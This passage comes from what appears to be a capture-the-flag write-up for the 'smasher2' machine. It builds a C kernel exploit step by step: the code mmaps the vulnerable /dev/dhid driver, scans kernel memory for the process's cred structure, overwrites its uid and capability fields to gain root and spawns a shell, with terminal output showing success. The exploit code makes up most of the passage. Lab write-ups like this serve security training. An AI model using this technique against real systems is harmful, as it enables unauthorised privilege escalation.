			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span>
			<span class="p">){</span>
				<span class="n">credNum</span><span class="o">++</span><span class="p">;</span>
				<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Cred structure found! ptr: %p, crednum: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">credNum</span><span class="p">);</span>
			<span class="p">}</span>

		<span class="n">addr</span><span class="o">++</span><span class="p">;</span>

	<span class="p">}</span>

	<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
	
	<span class="kt">int</span> <span class="n">stop</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p><br>It worked:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dzonerzy@smasher2:/dev/shm$ ./pwn 
[+] PID: 1215
[*] Open OK fd: 3
[*] mmap OK address: 42424000
[*] Current UID: 1000
[*] Cred structure found! ptr: 0x76186484, crednum: 1
[*] Cred structure found! ptr: 0x76186904, crednum: 2
[*] Cred structure found! ptr: 0x76186b44, crednum: 3
[*] Cred structure found! ptr: 0x76186cc4, crednum: 4
[*] Cred structure found! ptr: 0x76186d84, crednum: 5
[*] Cred structure found! ptr: 0x76186fc4, crednum: 6
[*] Cred structure found! ptr: 0x761872c4, crednum: 7
[*] Cred structure found! ptr: 0x76187684, crednum: 8
[*] Cred structure found! ptr: 0x76187984, crednum: 9
[*] Cred structure found! ptr: 0x76187b04, crednum: 10
[*] Cred structure found! ptr: 0x76187bc4, crednum: 11
[*] Cred structure found! ptr: 0x76187c84, crednum: 12
[*] Cred structure found! ptr: 0x77112184, crednum: 13
[*] Cred structure found! ptr: 0x771123c4, crednum: 14
[*] Cred structure found! ptr: 0x77112484, crednum: 15
[*] Cred structure found! ptr: 0x771129c4, crednum: 16
[*] Cred structure found! ptr: 0x77113084, crednum: 17
[*] Cred structure found! ptr: 0x77113144, crednum: 18
[*] Cred structure found! ptr: 0x77113504, crednum: 19
[*] Cred structure found! ptr: 0x77113c84, crednum: 20
[*] Cred structure found! ptr: 0x7714a604, crednum: 21
[*] Cred structure found! ptr: 0x7714aa84, crednum: 22
[*] Cred structure found! ptr: 0x7714ac04, crednum: 23
[*] Cred structure found! ptr: 0x7714afc4, crednum: 24
[*] Cred structure found! ptr: 0x7714ba44, crednum: 25
[*] Cred structure found! ptr: 0xb9327bc4, crednum: 26

dzonerzy@smasher2:/dev/shm$ 
</code></pre></div></div>
<p><br>Now we need to overwrite the <code class="highlighter-rouge">cred</code> structure that belongs to our process, we’ll keep overwriting every <code class="highlighter-rouge">cred</code> structure we find and check our <code class="highlighter-rouge">uid</code>, when we overwrite the one that belongs to our process our <code class="highlighter-rouge">uid</code> should be <code class="highlighter-rouge">0</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>			<span class="n">credIt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		
			<span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
				<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Process cred structure found ptr: %p, crednum: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">credNum</span><span class="p">);</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="p">}</span>

</code></pre></div></div>
<p><br><code class="highlighter-rouge">pwn.c</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;                                                                          
#include &lt;stdlib.h&gt;                                                        
#include &lt;sys/types.h&gt;                                                       
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/mman.h&gt;
</span>
<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="k">const</span> <span class="o">*</span> <span class="n">argv</span><span class="p">){</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] PID: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">getpid</span><span class="p">());</span>
	<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/dhid"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
	
	<span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Open failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Open OK fd: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>

	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span> <span class="o">=</span> <span class="mh">0xf0000000</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mmapStart</span> <span class="o">=</span> <span class="mh">0x42424000</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span> <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">mmapStart</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">){</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"Failed to mmap: "</span><span class="p">);</span>
		<span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[*] mmap OK address: %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>

	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
	
	<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Current UID: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
	
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">credIt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">credNum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="k">while</span> <span class="p">(((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">addr</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">mmapStart</span> <span class="o">+</span> <span class="n">size</span> <span class="o">-</span> <span class="mh">0x40</span><span class="p">)){</span>

		<span class="n">credIt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	
		<span class="k">if</span><span class="p">(</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span>
			<span class="p">){</span>
				<span class="n">credNum</span><span class="o">++</span><span class="p">;</span>
			
				<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Cred structure found! ptr: %p, crednum: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">credNum</span><span class="p">);</span>
		
			<span class="n">credIt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		
			<span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
				<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Process cred structure found ptr: %p, crednum: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">credNum</span><span class="p">);</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="p">}</span>

			<span class="k">else</span><span class="p">{</span>
				<span class="n">credIt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
			<span class="p">}</span>
		<span class="p">}</span>

	<span class="n">addr</span><span class="o">++</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

<span class="kt">int</span> <span class="n">stop</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dzonerzy@smasher2:/dev/shm$ ./pwn 
[+] PID: 4773
[*] Open OK fd: 3
[*] mmap OK address: 42424000
[*] Current UID: 1000
[*] Cred structure found! ptr: 0x76186484, crednum: 1
[*] Cred structure found! ptr: 0x76186904, crednum: 2
[*] Cred structure found! ptr: 0x76186b44, crednum: 3
[*] Cred structure found! ptr: 0x76186cc4, crednum: 4
[*] Cred structure found! ptr: 0x76186fc4, crednum: 5
[*] Cred structure found! ptr: 0x76187684, crednum: 6
[*] Cred structure found! ptr: 0x76187bc4, crednum: 7
[*] Cred structure found! ptr: 0x77112184, crednum: 8
[*] Cred structure found! ptr: 0x771123c4, crednum: 9
[*] Cred structure found! ptr: 0x77112484, crednum: 10
[*] Cred structure found! ptr: 0x771129c4, crednum: 11
[*] Cred structure found! ptr: 0x77113084, crednum: 12
[*] Cred structure found! ptr: 0x77113144, crednum: 13
[*] Cred structure found! ptr: 0x77113504, crednum: 14
[*] Cred structure found! ptr: 0x77113c84, crednum: 15
[*] Cred structure found! ptr: 0x7714a484, crednum: 16
[*] Cred structure found! ptr: 0x7714a604, crednum: 17
[*] Cred structure found! ptr: 0x7714a6c4, crednum: 18
[*] Cred structure found! ptr: 0x7714a844, crednum: 19
[*] Cred structure found! ptr: 0x7714a9c4, crednum: 20
[*] Cred structure found! ptr: 0x7714aa84, crednum: 21
[*] Cred structure found! ptr: 0x7714ac04, crednum: 22
[*] Cred structure found! ptr: 0x7714ad84, crednum: 23
[*] Process cred structure found ptr: 0x7714ad84, crednum: 23

dzonerzy@smasher2:/dev/shm$
</code></pre></div></div>
<p><br>Great! now what’s left to do is to overwrite the capabilities in our <code class="highlighter-rouge">cred</code> structure with <code class="highlighter-rouge">0xffffffffffffffff</code> and execute <code class="highlighter-rouge">/bin/sh</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>				<span class="n">credIt</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span> 
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>

				<span class="n">execl</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span><span class="s">"-"</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>
<p><br><code class="highlighter-rouge">pwn.c</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;                                                         
#include &lt;stdlib.h&gt;                                                      
#include &lt;sys/types.h&gt;                                                              
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/mman.h&gt;
</span>
<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="k">const</span> <span class="o">*</span> <span class="n">argv</span><span class="p">){</span>
	
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[93m[+] PID: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">getpid</span><span class="p">());</span>
	<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/dhid"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
	
	<span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[93m[!] Open failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[32m[*] Open OK fd: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>

	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span> <span class="o">=</span> <span class="mh">0xf0000000</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mmapStart</span> <span class="o">=</span> <span class="mh">0x42424000</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span> <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">mmapStart</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">){</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[93m[!] Failed to mmap !"</span><span class="p">);</span>
		<span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[32m[*] mmap OK address: %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>
	
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
	
	<span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[93m[+] Searching for the process cred structure ..."</span><span class="p">);</span>
	
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">credIt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">credNum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	
	<span class="k">while</span> <span class="p">(((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">addr</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">mmapStart</span> <span class="o">+</span> <span class="n">size</span> <span class="o">-</span> <span class="mh">0x40</span><span class="p">)){</span>
		<span class="n">credIt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">if</span><span class="p">(</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span>
			<span class="p">){</span>
				<span class="n">credNum</span><span class="o">++</span><span class="p">;</span>
				
				<span class="n">credIt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		
			<span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
			
				<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[32m[*] Cred structure found ! ptr: %p, crednum: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">credNum</span><span class="p">);</span>
				<span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[32m[*] Got Root"</span><span class="p">);</span>
				<span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[32m[+] Spawning a shell"</span><span class="p">);</span>

				<span class="n">credIt</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span> 
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>

				<span class="n">execl</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span><span class="s">"-"</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nb">NULL</span><span class="p">);</span>
				<span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[93m[!] Execl failed..."</span><span class="p">);</span>
			
				<span class="k">break</span><span class="p">;</span>
			<span class="p">}</span>
			<span class="k">else</span><span class="p">{</span>
				
				<span class="n">credIt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
